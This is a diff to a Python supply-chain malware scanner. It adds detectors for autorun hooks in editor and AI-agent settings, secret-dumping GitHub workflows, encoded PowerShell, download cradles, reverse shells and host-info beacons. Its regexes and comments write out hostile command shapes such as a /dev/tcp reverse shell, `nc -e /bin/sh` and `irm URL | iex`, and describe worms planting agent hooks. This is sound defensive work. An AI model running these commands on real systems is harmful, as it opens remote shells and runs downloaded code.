+        text = read(rel) if rel is not None else None
+        if text is None:
+            continue
+        found = _autorun_script_risk(text)
+        if len(set(OBF_IDENT_RE.findall(text))) >= 5:
+            found.append("is obfuscated")
+        if found:
+            return found, target
+    return [], None
+
+
+def autorun_issues(path, lines, read=None):
+    """SC-AUTORUN findings for a settings file (autorun.config_kind(path) is
+    not None) whose text is lines; read(rel) returns the text of a file of
+    the tree ('/'-separated, root-relative) or None, to follow a command into
+    the files it runs (None: the commands alone are judged)."""
+    kind, tool = autorun.config_kind(path)
+    found, error = autorun.entries(kind, tool, "\n".join(lines))
+    if error is not None:
+        return [mk_issue(_autorun_rule(
+            "MAJOR", f"These {tool} settings could not be read as JSON (line {error[0]}: {error[1]}), "
+                     f"but they name commands for {tool} to run: read them by hand.",
+            _AUTORUN_WHY, "Fix the file so it can be read, and check every command it names.",
+        ), path, error[0], lines)]
+    base = autorun.owner_dir(path)
+    out = []
+    for e in found:
+        cmd = e["command"]
+        if cmd is None:
+            out.append(mk_issue(_autorun_rule(
+                "INFO", f"{e['trigger']}.", _AUTORUN_WHY + " Listed for inventory.",
+                "Check that you added it."), path, e["line"], lines))
+            continue
+        shown = cmd if len(cmd) <= AUTORUN_SHOW else cmd[:AUTORUN_SHOW] + "…"
+        reasons, target = _autorun_risk(cmd, base, read)
+        if not reasons:
+            out.append(mk_issue(_autorun_rule(
+                "INFO", f"{e['trigger']}: {shown!r}.", _AUTORUN_WHY + " Listed for inventory.",
+                "Check that you added it, and what it runs."), path, e["line"], lines))
+            continue
+        said = "; and ".join(reasons)
+        msg = (f"{e['trigger']}: {shown!r} — a command that {said}." if target is None else
+               f"{e['trigger']}: {shown!r}, which runs {target}; that file {said}.")
+        out.append(mk_issue(_autorun_rule(
+            "CRITICAL", msg, _AUTORUN_WHY + " This one runs code that looks hostile.",
+            "Do not open the folder in the editor or start the agent in it. Remove the entry and what it "
+            "runs, find the commit that added them, and rotate the credentials this machine holds if it "
+            "already ran."), path, e["line"], lines))
+    return out
+
+
+# ---------------- Workflows the worms planted (SC-WORKFLOW-*) ----------------
+_WORKFLOW_SECRETS_WHY = (
+    "`${{ toJSON(secrets) }}` is every secret of the repository in one value: a job that holds it can "
+    "leak them all, and a workflow that also sends it out is how the Shai-Hulud worms stole secrets "
+    "from the repositories they reached (a webhook.site upload, a build artifact).")
+_WORKFLOW_BACKDOOR_WHY = (
+    "A `${{ … }}` expression is pasted into the script before it runs, so text from an issue, a "
+    "discussion or a pull request becomes shell commands; on a self-hosted runner they run on that "
+    "machine. The second Shai-Hulud wave registered its victims' machines as self-hosted runners and "
+    "planted exactly this workflow (discussion.yaml): opening a discussion ran commands on the victim's "
+    "machine.")
+
+
+def workflow_issues(path, lines):
+    """SC-WORKFLOW-SECRETS / SC-WORKFLOW-BACKDOOR for a GitHub Actions workflow
+    (ghworkflow.is_workflow(path)) whose text is lines."""
+    out = []
+    for kind, line, d in ghworkflow.findings("\n".join(lines)):
+        if kind == "secrets":
+            sent = d["how"] is not None
+            out.append(mk_issue({
+                "id": "SC-WORKFLOW-SECRETS", "name": "Workflow hands out every secret", "type": "HOTSPOT",
+                "sev": "CRITICAL" if sent else "MAJOR",
+                "msg": (f"The workflow hands every repository secret to {d['where']} and sends data out "
+                        f"({d['how']}): the Shai-Hulud worms planted workflows like this." if sent else
+                        f"The workflow hands every repository secret to {d['where']} (toJSON(secrets)): any "
+                        f"step there can read them all."),
+                "why": _WORKFLOW_SECRETS_WHY,
+                "fix": ("Delete the workflow unless you wrote it, then rotate every secret of the repository. "
+                        "A job should get only the secrets it uses, by name (${{ secrets.NAME }})."),
+                "ref": "CWE-200 · Supply chain"}, path, line, lines))
+        else:
+            out.append(mk_issue({
+                "id": "SC-WORKFLOW-BACKDOOR", "name": "Workflow runs event text on a self-hosted runner",
+                "type": "HOTSPOT", "sev": "CRITICAL",
+                "msg": (f"The job \"{d['job']}\" puts {d['expr']} into a command on a self-hosted runner, and "
+                        f"{d['event']} events start it: anyone who can {d['act']} runs commands on that "
+                        f"machine."),
+                "why": _WORKFLOW_BACKDOOR_WHY,
+                "fix": ("Delete the workflow unless you wrote it, and remove any runner you did not register. "
+                        "Otherwise pass the text through an environment variable and quote it in the script."),
+                "ref": "CWE-94 · Supply chain"}, path, line, lines))
+    return out
+
+
+def tree_reader(files, configs):
+    """read(rel) for autorun_issues: the text of a scanned source or config
+    file ('/'-separated, root-relative; a path node would load resolves as
+    node_candidates does), with \\n line endings, or None."""
+    texts = {}
+    for f in list(files) + list(configs):
+        texts.setdefault(f["path"].replace(os.sep, "/"), f["content"])
+
+    def read(rel):
+        for cand in node_candidates(rel):
+            if cand in texts:
+                return normalize_newlines(texts[cand])
+        return None
+    return read
+
+
+def scan_config_file(path, content, read=None):
+    """Credentials in a config or data file (see configsecrets): S-TOKEN on
+    every line, S-SECRET outside comments. Nothing else runs — it is not
+    code. Suppression markers work in the file's comments, as in code. An
+    editor's or AI agent's settings that run commands also get SC-AUTORUN
+    (read: see autorun_issues), and a GitHub Actions workflow the
+    SC-WORKFLOW-* checks."""
+    lines = source_lines(_unicode13.pin(content), "cfg")
+    content = "\n".join(lines)
+    ctx = _ConfigCtx(lines, "cfg", content, time.monotonic() + SCAN_TIME_BUDGET, False)
+    outer = getattr(_TLS, "ctx", None)
+    _TLS.ctx = ctx
+    try:
+        issues = []
+        try:
+            if autorun.config_kind(path) is not None:
+                issues.extend(autorun_issues(path, lines, read))
+            if ghworkflow.is_workflow(path):
+                issues.extend(workflow_issues(path, lines))
+            for i, line in enumerate(lines):
+                ctx.check_time()
+                if not line or line.isspace():
+                    continue
+                col = _config_token_col(line, lines, i)
+                if col is not None:
+                    issues.append(mk_issue(_TOKEN_RULE, path, i + 1, lines, col))
+                if not ctx.cmask[i]:
+                    col = configsecrets.secret_col(ctx.code[i])
+                    if col is not None:
+                        issues.append(mk_issue(CONFIG_SECRET_RULE, path, i + 1, lines, col))
+        except _ScanBudgetExceeded:
+            issues.append(truncated_issue(path, "scan time budget exceeded"))
+        return cap_issues(path, [i for i in issues if not ctx.suppressed(i)], lines)
+    finally:
+        _TLS.ctx = outer
+
+
 # Rules that also run on comment lines.
 _COMMENT_LINE_RULES = frozenset(("Q-TODO", "S-TOKEN", "S-BIDI"))
 
@@ -3672,10 +4858,43 @@ def _joined_eval_decode(ctx, i, rule_re):
 # RegExp.prototype.exec (the `for (re.lastIndex = 0; (m = re.exec(t));)`
 # loop of every bundler's output), `session.exec(q)` a database call. The
 # other sink names are distinctive and count on any receiver.
-_DECODE_CALL_RE = re.compile(
+_DECODE_CALL_SRC = (
     r"(?:\batob|\bb64decode|\.\s*fromhex|\bunhexlify|\b" + _module_ref("codecs") + r"\s*\.\s*decode"
-    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress)\s*\("
+    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress|\.\s*decrypt)\s*\("
     r"|\bBuffer\s*\.\s*from\s*\([^;\n]{0,300}?['\"`]base64['\"`]")
+_DECODE_CALL_RE = re.compile(_DECODE_CALL_SRC)
+# A decoder imported under another name, whose calls decode too: `from base64
+# import b64decode as invoke` then `exec(invoke('aW1w…'))` hid a payload from
+# the decode flow in two malicious PyPI packages. (`.decrypt(` — a Fernet or
+# AES cipher's — is a decode call of its own: `exec(Fernet(k).decrypt(t))`.)
+_DECODER_IMPORT_RE = re.compile(
+    r"^[ \t]*from[ \t]+(?:base64|binascii|codecs|zlib|marshal|bz2|lzma|gzip)[ \t]+import[ \t]+([^\n#]{1,300})", re.M)
+_DECODER_NAMES = frozenset((
+    "b64decode", "b32decode", "b85decode", "a85decode", "decodebytes", "standard_b64decode", "urlsafe_b64decode",
+    "unhexlify", "a2b_base64", "a2b_hex", "decode", "decompress", "loads"))
+_PLAIN_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
+
+
+def _decoder_aliases(text):
+    """Names a Python file binds to a decoder with `from … import d as name`."""
+    out = []
+    if "import" not in text or " as " not in text:
+        return out
+    for m in _DECODER_IMPORT_RE.finditer(text):
+        for part in m.group(1).replace("(", " ").replace(")", " ").split(","):
+            bits = part.split()
+            if (len(bits) == 3 and bits[1] == "as" and bits[0] in _DECODER_NAMES
+                    and _PLAIN_NAME_RE.match(bits[2]) and bits[2] not in out):
+                out.append(bits[2])
+    return out[:20]
+
+
+def _file_decode_re(content):
+    """_DECODE_CALL_RE, with the calls of the file's decoder aliases."""
+    aliases = _decoder_aliases(content)
+    if not aliases:
+        return _DECODE_CALL_RE
+    return re.compile(_DECODE_CALL_SRC + r"|(?<![\w.])(?:" + "|".join(aliases) + r")\s*\(")
 # The receiver starts at an identifier boundary: without (?<![\w$]) every
 # position inside a long identifier retried the whole rest of it ('a' * 20,000
 # on one line: 4.8 s).
@@ -3757,6 +4976,7 @@ def _dep_decode_flow(path, ctx, issues):
     cp_aliases = _child_process_aliases(ctx.content) if ctx.lang == "js" else frozenset()
     decoded = {}                      # name -> (line of the decode, its offset in the file)
     offset = 0                        # offset of line i in the file
+    decode_re = _file_decode_re(ctx.content) if ctx.lang == "py" else _DECODE_CALL_RE
     for i in range(len(ctx.lines)):
         base, offset = offset, offset + len(ctx.lines[i]) + 1
         if ctx.cmask[i]:
@@ -3766,7 +4986,7 @@ def _dep_decode_flow(path, ctx, issues):
             continue
         if not i & 63:
             ctx.check_time()
-        has_decode = _DECODE_CALL_RE.search(code) is not None
+        has_decode = decode_re.search(code) is not None
         if not decoded and not has_decode:
             continue
         blank = _blank_strings(code)
@@ -3788,7 +5008,7 @@ def _dep_decode_flow(path, ctx, issues):
             at = base + pos
             if kind == 0:
                 a, b = m.span(2)
-                if _DECODE_CALL_RE.search(code, a, b):
+                if decode_re.search(code, a, b):
                     decoded[m.group(1)] = (i + 1, at)
                     continue
                 src = live(a, b, at)
@@ -3812,7 +5032,7 @@ def _dep_decode_flow(path, ctx, issues):
             if src:
                 msg = (f"Decoded payload (assigned at line {min(d[0] for d in src)}) "
                        f"reaches a code-execution sink.")
-            elif _DECODE_CALL_RE.search(code, m.end(), end):
+            elif decode_re.search(code, m.end(), end):
                 msg = "Decoded payload reaches a code-execution sink in the same call."
             else:
                 continue
@@ -4772,6 +5992,474 @@ _DL_CATEGORY_REASON = {
 }
 
 
+# ---------------- PowerShell, stagers, reverse shells, host information ----------------
+# The install-script blind spots of the audit's PyPI benchmark (0.1.7), each a
+# shape a legitimate install script has no use for:
+#
+# * PowerShell started with an encoded command (-EncodedCommand, or any prefix
+#   PowerShell accepts: -e, -ec, -enc, …; base64 of UTF-16LE text): 68 of 200
+#   malicious PyPI packages ran `powershell -WindowStyle Hidden -EncodedCommand
+#   …` from setup.py to fetch an .exe from Discord's CDN and start it. The
+#   command is decoded, and what it does is named when it downloads and runs
+#   code. Plain PowerShell that downloads and runs code — a cradle (`irm URL |
+#   iex`, `IEX (New-Object Net.WebClient).DownloadString(URL)`) or a download
+#   written to a file and started (`Invoke-WebRequest -OutFile f` then
+#   `Start-Process f`) — is the same thing unencoded.
+# * A script carried in a string literal that downloads and runs code: a
+#   setup.py that writes `b"""from urllib.request import urlopen as u;exec(u(
+#   'https://…').read())"""` to a temporary file and starts it with pythonw.
+#   The literal's text is read as code (its `;`-separated statements one per
+#   line) by the received-code test.
+# * A reverse shell: a socket's descriptor made a shell's standard streams
+#   (`os.dup2(s.fileno(), 0)` … `subprocess.call(["/bin/sh", "-i"])`),
+#   `bash -i >& /dev/tcp/HOST/PORT 0>&1`, `nc -e /bin/sh`, or a spawned shell
+#   piped to a net.Socket.
+# * The machine's user or host name (or the output of whoami, hostname,
+#   ifconfig …) collected in a script that sends data over the network: the
+#   dependency-confusion beacon.
+_PS_RE = re.compile(r"\b(?:powershell|pwsh)(?:\.exe)?\b", re.I)
+_PS_ENCODED_RE = re.compile(
+    r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,400}?[\s\"',\[(][-/\u2013\u2014]"
+    r"(?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode"
+    r"|encod|enco|enc|en|ec|e)[\s\"',]+([A-Za-z0-9+/]{16}[A-Za-z0-9+/]*={0,2})", re.I)
+_PS_ENCODED_MAX = 65536          # base64 characters of one command that are decoded
+_PS_CRADLE_RE = re.compile(
+    r"\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget)\b[^\n|;]{0,400}\|\s*(?:iex|Invoke-Expression)\b"
+    r"|\b(?:iex|Invoke-Expression)\b[\s(]{0,8}(?:New-Object\s+(?:System\.)?Net\.WebClient\s*\)\s*\.\s*DownloadString"
+    r"|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
+    r"|\.DownloadString\s*\([^\n)]{0,400}\)\s*\|\s*(?:iex|Invoke-Expression)\b", re.I)
+_PS_DOWNLOAD_FILE_RE = re.compile(
+    r"\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl(?:\.exe)?|wget|Start-BitsTransfer)\b[^\n]{0,400}?"
+    r"\s-(?:OutFile|Destination|o)\b|\.DownloadFile\s*\(", re.I)
+_PS_START_RE = re.compile(r"\b(?:Start-Process|saps|Invoke-Item|Invoke-Expression|iex)\b", re.I)
+
+
+def _powershell_script_risk(ps):
+    """What PowerShell text `ps` does that an install script should not:
+    'downloads and runs code' or None."""
+    if _PS_CRADLE_RE.search(ps) or (_PS_DOWNLOAD_FILE_RE.search(ps) and _PS_START_RE.search(ps)):
+        return "downloads and runs code"
+    return None
+
+
+def _decode_powershell(b64):
+    """The UTF-16LE text of an -EncodedCommand argument ('' when it is not
+    base64): the first _PS_ENCODED_MAX characters, padded, an odd last byte
+    dropped."""
+    b64 = b64[:_PS_ENCODED_MAX]
+    b64 = b64[:len(b64) - len(b64) % 4] if b64.endswith("=") else b64 + "=" * (-len(b64) % 4)
+    try:
+        data = base64.b64decode(b64, validate=True)
+    except (ValueError, TypeError):
+        return ""
+    return data[:len(data) // 2 * 2].decode("utf-16-le", "replace")
+
+
+def powershell_risk(text):
+    """Reasons PowerShell in `text` looks hostile (see above), [] if none."""
+    if not _PS_RE.search(text):
+        return []
+    reasons = []
+    for m in _PS_ENCODED_RE.finditer(text):
+        does = _powershell_script_risk(_decode_powershell(m.group(1)))
+        reasons.append("runs an encoded PowerShell command" + (f" that {does}" if does else ""))
+        break
+    if not reasons:
+        does = _powershell_script_risk(text)
+        if does:
+            reasons.append(f"runs PowerShell that {does}")
+    return reasons
+
+
+_STAGER_MIN = 24                 # characters of a literal worth reading as a script
+_STAGER_MAX_LITERALS = 2000      # literals examined per text
+_STAGER_RUN_NEEDLES = ("exec", "eval", "Function", "system", "popen", "spawn", "-c")
+_STAGER_NET_NEEDLES = ("urlopen", "requests", "urllib", "http", "fetch", "curl", "wget", "socket")
+
+
+def _string_literals(text):
+    """(offset, contents) of the string literals of `text` ('…', "…", `…`
+    and Python's triple-quoted forms; escapes are skipped, not decoded; a
+    one-quote literal ends at its line), in order, at most
+    _STAGER_MAX_LITERALS of them. One pass."""
+    out, i, n = [], 0, len(text)
+    while i < n and len(out) < _STAGER_MAX_LITERALS:
+        ch = text[i]
+        if ch not in "\"'`":
+            i += 1
+            continue
+        if ch != "`" and text.startswith(ch * 3, i):
+            j = text.find(ch * 3, i + 3)
+            end = n if j < 0 else j
+            out.append((i, text[i + 3:end]))
+            i = end + 3
+            continue
+        j = i + 1
+        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
+            j += 2 if text[j] == "\\" else 1
+        out.append((i, text[i + 1:min(j, n)]))
+        i = j + 1
+    return out
+
+
+def stager_at(text):
+    """The offset of a string literal of `text` that holds a script that
+    downloads and runs code (see above), else -1."""
+    if not any(nd in text for nd in _STAGER_NET_NEEDLES):
+        return -1
+    for at, lit in _string_literals(text):
+        if (len(lit) >= _STAGER_MIN and any(nd in lit for nd in _STAGER_RUN_NEEDLES)
+                and any(nd in lit for nd in _STAGER_NET_NEEDLES)):
+            found = _received_code_kind(lit.replace(";", "\n"))
+            if found is not None and found[1] == "run":
+                return at
+    return -1
+
+
+_REVSHELL_DUP2_RE = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)")
+_REVSHELL_SHELL_RE = re.compile(r"""["'](?:/bin/(?:ba|z|da|k)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']|\bpty\.spawn\s*\(""")
+_REVSHELL_LINE_RE = re.compile(
+    r"\b(?:ba|z|k)?sh\s+-i\b[^\n]{0,80}?[<>]&?\s*/dev/(?:tcp|udp)/"
+    r"|/dev/(?:tcp|udp)/[\w.\-]+/\d+[^\n]{0,40}?0\s*>\s*&\s*1"
+    r"|\b(?:nc|ncat|netcat)\b[^\n]{0,120}?\s-[ec]\s+[\"']?(?:/bin/)?(?:ba|z)?sh\b")
+_REVSHELL_JS_SPAWN_RE = re.compile(r"""\bspawn\s*\(\s*["'](?:/bin/(?:ba|z)?sh|cmd(?:\.exe)?)["']""")
+_REVSHELL_JS_PIPE_RE = re.compile(r"\.pipe\s*\(\s*[\w$.]+\.stdin\s*\)")
+_REVSHELL_JS_NET_RE = re.compile(r"\bnet\s*\.\s*(?:Socket|connect|createConnection)\b|\bnew\s+Socket\s*\(")
+
+
+def reverse_shell_at(text):
+    """The offset where `text` opens a reverse shell (see above), else -1."""
+    m = _REVSHELL_LINE_RE.search(text)
+    if m:
+        return m.start()
+    if "dup2" in text:
+        m = _REVSHELL_DUP2_RE.search(text)
+        if m and _REVSHELL_SHELL_RE.search(text):
+            return m.start()
+    if "pty" in text and "socket" in text and "connect" in text and "pty.spawn" in text:
+        return text.index("pty.spawn")
+    if "spawn" in text:
+        m = _REVSHELL_JS_SPAWN_RE.search(text)
+        if m and _REVSHELL_JS_PIPE_RE.search(text) and _REVSHELL_JS_NET_RE.search(text):
+            return m.start()
+    return -1
+
+
+_HOST_INFO_RE = re.compile(
+    r"\b(?:socket\.gethostname|socket\.getfqdn|platform\.node|getpass\.getuser|os\.getlogin|pwd\.getpwuid"
+    r"|os\.hostname|os\.userInfo)\s*\("
+    r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id|uname"""
+    r"""|ifconfig|ipconfig|systeminfo)\b"""
+    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b")
+
+
+def sends_host_info(text):
+    """True when `text` collects the machine's user or host name (or runs
+    whoami, hostname, ifconfig …) and sends data over the network."""
+    return bool(_HOST_INFO_RE.search(text) and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)))
+
+
+# Code read back from the file itself (0.1.7). A payload — or a hint such as
+# a C2 address — can sit in a comment or a docstring of the file that uses
+# it, read back with open(__file__), Path(__file__).read_text(), linecache,
+# __loader__.get_source or __doc__ (in JavaScript readFileSync(__filename),
+# import.meta.url, a function's .toString()). Running what such a read gives —
+# or what a read of a data file shipped next to the code gives (a path built
+# from __file__ / __dirname / import.meta.url that names a file with a
+# non-code extension: .txt, .dat, .png …) — is a sign of its own: a value
+# assigned from the read is followed through the names it is assigned to
+# (_SELF_READ_PASSES levels), to a runner's arguments (at most
+# _SELF_READ_ARG_SPAN characters of each of the first _SELF_READ_MAX_CALLS
+# runners). A .py or .js file read and run is not: setup.py's
+# `exec(open("pkg/version.py").read())` reads a version. The import-time test
+# reads a file that reads its own source with its prose (_import_code).
+_SELF_READ_RE = re.compile(
+    r"\bopen\s*\(\s*(?:os\.path\.(?:abspath|realpath)\s*\(\s*)?__file__\b"
+    r"|\bPath\s*\(\s*__file__\s*\)\s*\.\s*(?:read_text|read_bytes|open)\s*\("
+    r"|\blinecache\.getlines?\s*\(\s*__file__\b|(?<![\w.])__loader__\s*\.\s*get_source\s*\(|(?<![\w.])__doc__\b"
+    r"|\breadFile(?:Sync)?\s*\(\s*(?:__filename\b|(?:new\s+URL\s*\(\s*)?import\.meta\.url"
+    r"|fileURLToPath\s*\(\s*import\.meta\.url)|\barguments\s*\.\s*callee\b|\}\s*\)?\s*\.\s*toString\s*\(\s*\)")
+_DATA_EXT = (r"(?:txt|dat|bin|png|jpe?g|gif|ico|bmp|svg|wav|mp3|mp4|woff2?|ttf|json|md|cfg|ini|log|db|pyc|so|dll"
+             r"|dylib|exe)")
+_SIBLING_DATA_RE = re.compile(
+    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\([^\n]{0,200}?(?:__file__|__dirname|import\.meta\.url)"
+    r"[^\n]{0,200}?[\"'][^\"'\n]{1,100}\." + _DATA_EXT + r"[\"']"
+    r"|(?:__file__|__dirname)[^\n]{0,200}?[\"'][^\"'\n]{1,100}\." + _DATA_EXT + r"[\"'][^\n]{0,60}?"
+    r"\.\s*(?:read_text|read_bytes)\s*\(")
+_SELF_RUN_RE = re.compile(
+    r"(?<![\w.$])(?:exec|eval|compile)\s*\(|\bnew\s+Function\s*\(|\bvm\s*\.\s*run\w*\s*\("
+    r"|\b(?:execSync|system|popen|Popen|check_output|getoutput)\s*\(|\bsubprocess\s*\.\s*\w+\s*\(")
+_SELF_READ_ASSIGN_RE = re.compile(
+    r"(?<![^\n])[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*(?::[^=\n]*)?=(?![=>])([^\n]*)")
+_IDENT_TOKEN_RE = re.compile(r"(?<![\w$.])[A-Za-z_$][\w$]*")
+_SELF_READ_PASSES = 3            # levels of names followed from a read
+_SELF_READ_MAX_CALLS = 200       # runners examined per text
+_SELF_READ_ARG_SPAN = 2000       # characters of a runner's arguments read
+_SELF_READ_MAX_ASSIGNS = 5000    # assignments examined per text
+
+
+def reads_own_source(text):
+    """Does `text` read its own source (see above)?"""
+    return _SELF_READ_RE.search(text) is not None
+
+
+def _call_args(text):
+    """`text` (what follows a call's '(') up to the bracket that closes the
+    call; string literals are skipped."""
+    depth, i, n = 0, 0, len(text)
+    while i < n:
+        ch = text[i]
+        if ch in "\"'`":
+            j = text.find(ch, i + 1)
+            if j < 0:
+                return text
+            i = j + 1
+            continue
+        if ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            if depth == 0:
+                return text[:i]
+            depth -= 1
+        i += 1
+    return text
+
+
+_LITERAL_SPANS_MAX = 20000       # literals a text's runners and reads are told apart from
+
+
+def _literal_spans(text):
+    """(start, end) of the string literals of `text`, as _string_literals
+    reads them (at most _LITERAL_SPANS_MAX of them). One pass."""
+    out, i, n = [], 0, len(text)
+    while i < n and len(out) < _LITERAL_SPANS_MAX:
+        ch = text[i]
+        if ch not in "\"'`":
+            i += 1
+            continue
+        if ch != "`" and text.startswith(ch * 3, i):
+            j = text.find(ch * 3, i + 3)
+            end = n if j < 0 else j + 3
+            out.append((i, end))
+            i = end
+            continue
+        j = i + 1
+        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
+            j += 2 if text[j] == "\\" else 1
+        end = min(j + 1, n)
+        out.append((i, end))
+        i = end
+    return out
+
+
+def runs_own_source_at(text):
+    """The offset of a runner that runs code `text` reads from its own
+    source or from a data file shipped next to it (see above), else -1.
+    Runners, reads and names inside string literals do not count (a code
+    template in a string, a list of dunder names)."""
+    if not (_SELF_READ_RE.search(text) or _SIBLING_DATA_RE.search(text)):
+        return -1
+    spans = _literal_spans(text)
+    starts = [s for s, _ in spans]
+
+    def in_literal(pos):
+        k = bisect.bisect_right(starts, pos) - 1
+        return k >= 0 and pos < spans[k][1]
+
+    def reads(lo, hi):
+        part = text[lo:hi]
+        return any(not in_literal(lo + m.start()) for rx in (_SELF_READ_RE, _SIBLING_DATA_RE)
+                   for m in rx.finditer(part))
+
+    def uses(lo, hi, names):
+        return any(m.group() in names and not in_literal(lo + m.start())
+                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))
+
+    if not reads(0, len(text)):
+        return -1
+    assigns = []
+    for k, m in enumerate(_SELF_READ_ASSIGN_RE.finditer(text)):
+        if k >= _SELF_READ_MAX_ASSIGNS:
+            break
+        if not in_literal(m.start(1)):
+            assigns.append((m.group(1), m.start(2), m.end(2)))
+    names = set()
+    for _ in range(_SELF_READ_PASSES):
+        grown = False
+        for name, lo, hi in assigns:
+            if name not in names and (reads(lo, hi) or uses(lo, hi, names)):
+                names.add(name)
+                grown = True
+        if not grown:
+            break
+    for k, m in enumerate(_SELF_RUN_RE.finditer(text)):
+        if k >= _SELF_READ_MAX_CALLS:
+            break
+        if in_literal(m.start()):
+            continue
+        hi = m.end() + len(_call_args(text[m.end():m.end() + _SELF_READ_ARG_SPAN]))
+        if reads(m.end(), hi) or uses(m.end(), hi, names):
+            return m.start()
+    return -1
+
+
+# ---------------- Persistence targets (0.1.7) ----------------
+# Where the 2025-26 npm worms made themselves stay. Mini Shai-Hulud and the
+# keyv wave committed a Claude Code SessionStart hook (.claude/settings.json)
+# and a VS Code folder-open task (.vscode/tasks.json) to every repository they
+# reached, each running the other's copy of the loader, so opening a checkout
+# ran the worm; Shai-Hulud planted GitHub Actions workflows that dump every
+# repository secret, and a discussion-triggered one that runs the discussion
+# text on a self-hosted runner it registered on the victim's machine;
+# GlassWorm pushed editor extensions with `code --install-extension`. No
+# package needs to do any of this while it is installed, so each is a reason
+# of the install-script test (CRITICAL in an install hook). Import-time code
+# gets only the workflow that dumps every secret: a CLI's `init` command
+# legitimately writes agent hooks, editor tasks, MCP servers and CI workflows.
+#
+# A settings file is named whole (".claude/settings.json", a template's
+# `${home}/.claude/settings.json`) or as the two literals a path join takes
+# (`path.join(home, ".claude", "settings.json")`, `Path.home() / ".claude" /
+# "settings.json"`); _PERSIST_AGENT_PAIRS says which file each directory's
+# tool runs commands from. The file must also be written: by a write call
+# anywhere in the text (fs, fs-extra, pathlib, json.dump, open(…, "w"),
+# shutil, Octokit's createOrUpdateFileContents), or by a shell write on a line
+# that names it (a redirection, tee, cp, mv, PowerShell's Set-Content …).
+_PERSIST_AGENT_SRC = (
+    r"""(?:\.(?:claude|gemini)[/\\]settings(?:\.local)?|\.vscode[/\\](?:tasks|mcp)|\.cursor[/\\](?:hooks|mcp)"""
+    r"""|(?<![\w.-])\.(?:mcp|claude))\.json(?![\w.-])""")
+_PERSIST_AGENT_SPLIT_SRC = (
+    r"""["'`]\.(claude|gemini|vscode|cursor)["'`]\s{0,20}[,+/]\s{0,20}["'`](settings(?:\.local)?|tasks|hooks|mcp)\.json["'`]""")
+_PERSIST_AGENT_PAIRS = {"claude": ("settings", "settings.local"), "gemini": ("settings",),
+                        "vscode": ("tasks", "mcp"), "cursor": ("hooks", "mcp")}
+_PERSIST_WORKFLOW_SRC = r"""\.github[/\\]workflows\b|["'`]\.github["'`]\s{0,20}[,+/]\s{0,20}["'`]workflows\b"""
+_PERSIST_EXT_DIR_SRC = (
+    r"""[/\\]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)[/\\]extensions\b"""
+    r"""|["'`]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)["'`]\s{0,20}[,+/]\s{0,20}"""
+    r"""["'`]extensions["'`]""")
+_PERSIST_WRITE_SRC = (
+    r"""\b(?:writeFileSync|writeFile|appendFileSync|appendFile|createWriteStream|outputFileSync|outputFile"""
+    r"""|outputJsonSync|outputJson|writeJsonSync|writeJson|copyFileSync|copyFile|cpSync|renameSync|symlinkSync"""
+    r"""|write_text|write_bytes|createOrUpdateFileContents)\s*\(|\bjson\.dump\s*\(|\bshutil\.(?:copy\w*|move)\s*\("""
+    r"""|\bopen\s*\([^()\n]{0,300}?["'][wax]b?\+?["']""")
+_PERSIST_SHELL_WRITE_SRC = (
+    r""">|\b(?:tee|cp|mv|install|ln|copy|xcopy)\s|\b(?:Set-Content|Out-File|Add-Content|Copy-Item|New-Item)\b"""
+    r"""|\bgit\s+(?:add|commit)\b""")
+_PERSIST_EXT_INSTALL_SRC = r"""--install-extension\b"""
+# An editor's CLI at a command's start (a line start is written `(?<![^\n])`:
+# under re.M, JavaScript's `^` would also match after \r and \u2028), and a
+# runner's release or its config script. Each is matched once per line with
+# what must follow it later on that line (_after_on_line): a pattern with a
+# gap between the two, `code[^\n]{0,400}?--install-extension`, is searched
+# again from every start, 400 times the text's length.
+_PERSIST_EXT_CLI_SRC = (
+    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?(?:code|code-insiders|codium|cursor|windsurf|positron)(?:\.cmd|\.exe)?"""
+    r"""[ \t]""")
+_PERSIST_RUNNER_SRC = r"""actions/runner/releases|\bactions-runner-(?:linux|osx|win)-"""
+_PERSIST_RUNNER_CONFIG_SRC = r"""\bconfig\.(?:sh|cmd)\b"""
+_PERSIST_RUNNER_ARG_SRC = r"""--(?:token|url)\b"""
+_BUN_RELEASES_SRC = r"""oven-sh/bun/releases"""
+_SECRETS_DUMP_SRC = r"""\btoJSON\s*\(\s*secrets\s*\)"""
+_PERSIST_AGENT_RE = re.compile(_PERSIST_AGENT_SRC)
+_PERSIST_AGENT_SPLIT_RE = re.compile(_PERSIST_AGENT_SPLIT_SRC)
+_PERSIST_WORKFLOW_RE = re.compile(_PERSIST_WORKFLOW_SRC)
+_PERSIST_EXT_DIR_RE = re.compile(_PERSIST_EXT_DIR_SRC)
+_PERSIST_WRITE_RE = re.compile(_PERSIST_WRITE_SRC)
+_PERSIST_SHELL_WRITE_RE = re.compile(_PERSIST_SHELL_WRITE_SRC)
+_PERSIST_EXT_INSTALL_RE = re.compile(_PERSIST_EXT_INSTALL_SRC)
+_PERSIST_EXT_CLI_RE = re.compile(_PERSIST_EXT_CLI_SRC)
